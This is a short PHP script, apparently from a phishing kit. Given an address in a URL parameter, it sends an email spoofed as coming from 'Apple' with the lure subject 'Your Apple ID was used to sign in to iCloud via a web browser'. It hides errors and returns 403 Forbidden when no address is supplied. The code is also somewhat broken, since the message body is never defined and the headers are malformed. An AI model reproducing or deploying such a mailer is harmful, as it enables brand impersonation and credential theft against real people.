<?php
error_reporting(0);
if (isset($_GET["email"])) {
    $name = "Apple"; $to = $_GET["email"]; $web="$_SERVER[HTTP_HOST]"; 
    $subject = "Your Apple ID was used to sign in to iCloud via a web browser"; 
    $email = "Apple@$web"; 
    $headers = 'From: ' .
    $email . "\r\n". 
    $headers = "Content-type: text/html\r\n"; 'Reply-To: ' . 
    $email. "\r\n" . 'X-Mailer: PHP/' . phpversion(); 
    if (mail($to, $subject, $body, $headers, $name)) {
        echo("Email sent to => $to"); 
    } else { 
        echo("Not support for mailer");
    }
} else {
    header('HTTP/1.1 403 Forbidden');
}
?>
